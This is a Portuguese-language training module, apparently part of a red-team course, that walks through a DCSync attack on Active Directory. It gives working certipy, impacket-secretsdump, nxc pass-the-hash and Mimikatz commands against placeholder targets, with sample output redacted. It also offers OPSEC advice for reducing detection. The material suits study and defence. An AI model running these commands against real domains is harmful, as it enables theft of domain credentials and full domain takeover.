# DCSync, execução conceitual

Sintaxe real, alvos genéricos. Continuação direta do PFX obtido no módulo 01.

Variáveis.

```
<dc-ip>        IP do Domain Controller
<domain>       nome do domínio (por exemplo corp.local)
<dc-machine>   conta de máquina do DC (por exemplo DC01$)
<nt-hash>      hash NT da conta de máquina, obtido no passo PKINIT do módulo 01
```

## Passo 1, identidade a partir do certificado

No fim do módulo 01, o Certipy já devolveu o hash NT da conta de máquina via PKINIT.

```bash
certipy-ad auth -pfx <dc-machine>.pfx -dc-ip <dc-ip>
```

A saída traz o TGT e o hash NT da conta de máquina. Essa conta tem direito de replicação.

## Passo 2, replicar os segredos do domínio

Com o hash da conta de máquina do DC, o secretsdump pede a replicação. O `-just-dc` restringe ao dump de segredos do NTDS.

```bash
impacket-secretsdump '<domain>/<dc-machine>@<dc-ip>' \
  -hashes :<nt-hash> -just-dc
```

Saída (ilustrativa, valores omitidos).

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b...:<REDIGIDO>:::
krbtgt:502:aad3b...:<REDIGIDO>:::
...
[*] Kerberos keys grabbed
```

Os hashes aqui ficam deliberadamente omitidos. O ponto de estudo é o método, não os valores de um ambiente específico.

## Passo 3, usar o hash recuperado

Confirmação de Domain Admin via Pass the Hash contra o DC.

```bash
nxc smb <dc-ip> -u administrator -H <nt-hash-administrator>
nxc ldap <dc-ip> -u administrator -H <nt-hash-administrator>
```

Status `(Pwn3d!)` confirma acesso administrativo. A partir daqui, enumera-se a relação de confiança para o pivô cross-forest, no módulo [03](../03-cross-forest-fsp/).

## Variações da mesma técnica

- `impacket-secretsdump` com credencial de Domain Admin em vez do hash da conta de máquina, mesmo resultado.
- `-just-dc-user '<domain>/krbtgt'` para extrair apenas a krbtgt (mais discreto que o dump completo).
- Mimikatz `lsadump::dcsync /domain:<domain> /user:krbtgt` no Windows, equivalente nativo.

## OPSEC

O dump completo é barulhento, replica milhares de objetos de uma vez. Extrair apenas a conta de interesse (`-just-dc-user`) reduz o volume de tráfego DRSUAPI e o rastro descrito em [detection.md](detection.md).
